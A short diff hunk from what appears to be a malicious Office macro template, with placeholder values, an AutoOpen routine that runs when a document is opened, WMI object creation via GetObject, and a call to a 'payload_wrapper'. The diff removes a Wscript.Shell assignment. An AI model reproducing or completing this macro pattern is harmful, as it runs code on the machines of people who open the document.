@@ -10,7 +10,6 @@ Sub AutoOpen()
 	Dim var5 as String
 	
 	var3 = [int1]
-	var1 = "{[Wscript.Shell]}"
 	var5 = init_wmi("data1")
 	Set var2 = GetObject(var5)
 	var4 = payload_wrapper("data1")
